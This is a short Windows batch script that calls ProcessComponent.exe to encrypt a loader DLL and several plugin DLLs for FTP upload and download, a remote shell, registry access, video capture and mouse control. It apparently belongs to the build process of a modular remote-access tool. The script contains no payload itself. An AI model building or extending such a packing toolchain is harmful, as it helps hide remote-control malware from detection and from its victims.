@echo off

set errorlevel=0

:loop
cls
echo Press any key to ENCRYPT components
pause>nul

start /WAIT /B ProcessComponent.exe Loader.dll loader BootLog.csv
echo Loader Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe FtpComponent.dll dll
echo FtpComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe FtpDownloadComponent.dll dll
echo FtpDownloadComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe FtpUploadComponent.dll dll
echo FtpUploadComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe ShellComponent.dll dll
echo ShellComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe RegComponent.dll dll
echo RegComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe VideoComponent.dll dll
echo VideoComponent Errorlevel: %errorlevel%
set errorlevel=0

start /WAIT /B ProcessComponent.exe MouseComponent.dll dll
echo MouseComponent Errorlevel: %errorlevel%
set errorlevel=0


timeout 10